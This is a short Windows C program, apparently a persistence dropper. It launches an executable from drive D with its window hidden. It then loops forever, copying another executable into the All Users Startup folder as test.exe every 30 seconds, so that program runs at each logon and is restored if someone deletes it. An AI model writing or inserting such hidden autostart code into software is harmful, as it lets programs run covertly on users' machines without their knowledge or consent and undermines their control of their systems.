#include <windows.h>
#include <stdio.h>
int main()
{
	ShellExecute(NULL,"open","D:\\starttask.exe",NULL,NULL,SW_HIDE);
	while(1)
	{
		char temppath[200];
		char tempbuf[200];
		GetSystemDirectory(temppath,sizeof(temppath));
		sprintf(tempbuf,"%c%c\\Documents and Settings\\All Users\\¡¸¿ªÊ¼¡¹²Ëµ¥\\Programs\\Startup\\test.exe",temppath[0],temppath[1]);
		printf(tempbuf);

		CopyFile("D:\\qd.exe",tempbuf,true);
		Sleep(30000);
	}
	return 0;
}